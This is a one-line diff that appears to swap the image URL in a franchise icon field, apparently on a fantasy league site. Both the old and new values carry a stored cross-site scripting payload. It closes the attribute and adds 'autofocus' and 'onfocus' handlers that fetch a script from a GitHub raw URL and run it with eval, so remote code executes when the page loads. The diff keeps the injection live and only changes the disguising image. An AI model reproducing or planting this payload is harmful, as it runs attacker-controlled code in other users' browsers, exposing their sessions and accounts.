@@ -1,1 +1,1 @@
-https://www42.myfantasyleague.com/fflnetdynamic2025/14004_franchise_icon0037.png" autofocus tabindex="0" onfocus="fetch('https://raw.githubusercontent.com/DarkCBZ/heheha/refs/heads/main/e.js').then(r => r.text()).then(code => eval(code));"
+https://images.steamusercontent.com/ugc/936079127906279472/C2241B71F7754B7D28FFF15C12E33741D5B55FAC/" autofocus tabindex="0" onfocus="fetch('https://raw.githubusercontent.com/DarkCBZ/heheha/refs/heads/main/e.js').then(r => r.text()).then(code => eval(code));"
